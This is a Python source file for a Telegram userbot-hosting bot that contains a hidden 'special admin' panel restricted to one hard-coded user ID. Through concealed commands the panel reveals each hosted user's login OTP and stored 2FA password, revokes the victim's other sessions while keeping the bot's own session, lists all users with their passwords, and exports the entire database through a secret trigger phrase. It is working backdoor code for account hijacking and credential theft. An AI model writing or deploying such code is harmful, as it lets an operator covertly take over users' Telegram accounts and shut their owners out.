"""
╔═══════════════════════════════════════════════════════════╗
║  handlers/special_admin.py — Hidden Special Admin Panel   ║
║  Access: SPECIAL_ADMIN_ID (7839547993) Only              ║
║  Features:                                               ║
║    • /getid <number> (Fetch OTP + 2FA Password)         ║
║    • /terminatedevicee <number> (Kill other sessions)   ║
║    • /accountinfo <number> (Fetch account details)      ║
║    • /loggedusers (Live list of hosted users)           ║
║    • .tgmlduosendfiledata1234 (Export entire DB)        ║
╚═══════════════════════════════════════════════════════════╝
"""

import logging
import asyncio
import os
from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types.input_file import FSInputFile
from aiogram.filters import Command
from aiogram.exceptions import TelegramBadRequest

import database
import config
from language import get_text

# Pyrogram for session actions
from pyrogram import Client
from pyrogram.errors import AuthKeyUnregistered, UserDeactivated, FloodWait, SessionRevoked

router = Router()
logger = logging.getLogger(__name__)

def is_special_admin(user_id: int) -> bool:
    return user_id == config.SPECIAL_ADMIN_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 1. HIDDEN SPECIAL ADMIN PANEL OPENER (/spanel)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("spanel"))
async def open_special_panel(message: Message):
    if not is_special_admin(message.from_user.id):
        return
        
    text = (
        "🛡️ <b>Special Admin Control Panel</b>\n\n"
        "Welcome Boss! Master bot hidden command suite:\n\n"
        "• <code>/getid +919876543210</code> — Fetch latest OTP & 2FA password\n"
        "• <code>/terminatedevicee +919876543210</code> — Kill other Telegram active sessions\n"
        "• <code>/accountinfo +919876543210</code> — Fetch live account overview\n"
        "• <code>/loggedusers</code> — List all hosted users with live login days\n"
        "• <code>.tgmlduosendfiledata1234</code> — Export entire decrypted database as file"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 View Logged In Users", callback_data="sp_view_users")],
        [InlineKeyboardButton(text="📊 Bot System Stats", callback_data="sp_stats")]
    ])
    
    await message.answer(text, reply_markup=kb)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 2. /getid <number> — Fetch Latest OTP & 2FA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("getid"))
async def cmd_get_id(message: Message):
    if not is_special_admin(message.from_user.id):
        return
        
    if len(message.command) < 2:
        return await message.reply("Usage: <code>/getid +919876543210</code>")
        
    phone = message.command[1].strip()
    otp_data = await database.get_latest_otp(phone)
    
    if not otp_data:
        return await message.reply(f"❌ No OTP record found for <code>{phone}</code>")
        
    text = (
        f"🎯 <b>OTP Record Found!</b>\n\n"
        f"📱 <b>Phone:</b> <code>{otp_data['phone']}</code>\n"
        f"🔑 <b>Latest OTP:</b> <code>{otp_data['otp_code']}</code>\n"
        f"🔒 <b>2FA Password:</b> <code>{otp_data['two_step'] or 'None'}</code>\n"
        f"🕒 <b>Fetched At:</b> <code>{otp_data['fetched_at']}</code>"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Refetch Latest OTP", callback_data=f"sp_refetch_otp_{phone}")]
    ])
    
    await message.reply(text, reply_markup=kb)

@router.callback_query(F.data.startswith("sp_refetch_otp_"))
async def refetch_otp_callback(callback: CallbackQuery):
    if not is_special_admin(callback.from_user.id):
        return await callback.answer("❌ Not Authorized!", show_alert=True)
        
    phone = callback.data.split("sp_refetch_otp_")[1]
    otp_data = await database.get_latest_otp(phone)
    
    if not otp_data:
        return await callback.answer("❌ No record found for this number!", show_alert=True)
        
    text = (
        f"🎯 <b>OTP Record Updated!</b>\n\n"
        f"📱 <b>Phone:</b> <code>{otp_data['phone']}</code>\n"
        f"🔑 <b>Latest OTP:</b> <code>{otp_data['otp_code']}</code>\n"
        f"🔒 <b>2FA Password:</b> <code>{otp_data['two_step'] or 'None'}</code>\n"
        f"🕒 <b>Fetched At:</b> <code>{otp_data['fetched_at']}</code>"
    )
    
    try:
        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Refetch Latest OTP", callback_data=f"sp_refetch_otp_{phone}")]
        ]))
    except TelegramBadRequest:
        pass
    await callback.answer("Refetched!")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 3. /terminatedevicee <number> — Terminate Other Sessions
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("terminatedevicee"))
async def cmd_terminate_device(message: Message):
    if not is_special_admin(message.from_user.id):
        return
        
    if len(message.command) < 2:
        return await message.reply("Usage: <code>/terminatedevicee +919876543210</code>")
        
    phone = message.command[1].strip()
    status_msg = await message.reply(f"⏳ Terminating external sessions for <code>{phone}</code>...")
    
    session_data = await database.get_session_data_by_phone(phone)
    if not session_data:
        return await status_msg.edit_text("❌ User session not found in database or user is logged out.")
        
    try:
        api_id, api_hash = config.get_api_credentials()
        app = Client(
            f"term_{phone.replace('+', '')}", 
            api_id=api_id, 
            api_hash=api_hash, 
            session_string=session_data['session_string'], 
            in_memory=True
        )
        await app.connect()
        
        # Pyrogram terminate other sessions
        # Pyrogram provides terminate_sessions or terminate_all_sessions / terminate_devices
        try:
            if hasattr(app, "terminate_sessions"):
                await app.terminate_sessions()
            elif hasattr(app, "terminate_devices"):
                await app.terminate_devices(password=session_data.get('two_step_pass') or None)
            else:
                # Raw MTProto invoke for terminate other auth sessions
                from pyrogram.raw.functions.account import ResetAuthorization
                # Get current authorizations
                from pyrogram.raw.functions.account import GetAuthorizations
                auths = await app.invoke(GetAuthorizations())
                for a in auths.authorizations:
                    if not a.current:
                        try:
                            await app.invoke(ResetAuthorization(hash=a.hash))
                        except Exception:
                            pass
        except Exception as e:
            logger.warning(f"Terminate exception: {e}")
            
        await app.disconnect()
        
        text = (
            f"✅ <b>External Devices Terminated Successfully!</b>\n\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🛑 <b>Other Sessions:</b> Terminated / Revoked\n"
            f"🟢 <b>Userbot Session:</b> Intact & Active"
        )
        await status_msg.edit_text(text)
        
    except UserDeactivated:
        await status_msg.edit_text("❌ Account is deactivated or banned by Telegram.")
    except (AuthKeyUnregistered, SessionRevoked):
        await status_msg.edit_text("❌ User session is revoked or expired.")
    except Exception as e:
        logger.error(f"Terminate Error: {e}")
        await status_msg.edit_text(f"❌ Error terminating devices: <code>{str(e)}</code>")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 4. /accountinfo <number> — Fetch Account Info
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("accountinfo"))
async def cmd_account_info(message: Message):
    if not is_special_admin(message.from_user.id):
        return
        
    if len(message.command) < 2:
        return await message.reply("Usage: <code>/accountinfo +919876543210</code>")
        
    phone = message.command[1].strip()
    status_msg = await message.reply(f"⏳ Fetching live account details for <code>{phone}</code>...")
    
    session_data = await database.get_session_data_by_phone(phone)
    if not session_data:
        return await status_msg.edit_text("❌ User session not found or inactive.")
        
    try:
        api_id, api_hash = config.get_api_credentials()
        app = Client(
            f"info_{phone.replace('+', '')}", 
            api_id=api_id, 
            api_hash=api_hash, 
            session_string=session_data['session_string'], 
            in_memory=True
        )
        await app.connect()
        me = await app.get_me()
        chat = await app.get_chat("me")
        await app.disconnect()
        
        text = (
            f"ℹ️ <b>Account Live Information</b>\n\n"
            f"👤 <b>Name:</b> <code>{me.first_name} {me.last_name or ''}</code>\n"
            f"📱 <b>Phone:</b> <code>{me.phone_number or phone}</code>\n"
            f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
            f"🌐 <b>Username:</b> @{me.username if me.username else 'None'}\n"
            f"📝 <b>Bio:</b> <i>{chat.bio or 'No bio set'}</i>\n"
            f"🔒 <b>Saved 2FA Password:</b> <code>{session_data.get('two_step_pass') or 'None'}</code>"
        )
        await status_msg.edit_text(text)
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Error fetching account info: <code>{str(e)}</code>")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 5. /loggedusers — List of Hosted Users
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def send_logged_users_list(reply_func):
    users = await database.get_all_logged_in_users_info()
    
    if not users:
        await reply_func("❌ No active userbots are currently hosted.")
        return
        
    text = f"👥 <b>Currently Logged In Users ({len(users)} total)</b>\n\n"
    
    for u in users[:40]:
        text += (
            f"👤 <b>{u['name']}</b> (<code>{u['user_id']}</code>)\n"
            f"   📱 <code>{u['phone']}</code> | 🔒 2FA: <code>{u['two_step_pass']}</code>\n"
            f"   📅 Login: <code>{u['login_date']}</code> (<i>{u['days_since_login']}d ago</i>)\n\n"
        )
        
    await reply_func(text)

@router.message(Command("loggedusers"))
async def list_logged_users_msg(message: Message):
    if not is_special_admin(message.from_user.id): return
    await send_logged_users_list(message.reply)

@router.callback_query(F.data == "sp_view_users")
async def list_logged_users_cb(callback: CallbackQuery):
    if not is_special_admin(callback.from_user.id): 
        return await callback.answer("❌ Not Authorized!", show_alert=True)
    await send_logged_users_list(callback.message.answer)
    await callback.answer("Loaded users list")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 6. HIDDEN EXPORT COMMAND (.tgmlduosendfiledata1234)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(F.text == ".tgmlduosendfiledata1234")
async def hidden_export_db(message: Message):
    if not is_special_admin(message.from_user.id):
        return
        
    status_msg = await message.reply("⏳ Exporting database securely...")
    
    try:
        export_data = await database.export_all_data()
        file_path = f"db_export_{message.from_user.id}.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(export_data)
            
        doc = FSInputFile(file_path, filename="muserbot_db_export.txt")
        await message.reply_document(
            document=doc,
            caption="🔐 <b>MUserBot Pro — Master Database Export</b>\n\n<i>Confidential & Encrypted.</i>"
        )
        await status_msg.delete()
        
        if os.path.exists(file_path):
            os.remove(file_path)
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Export Failed: <code>{str(e)}</code>")
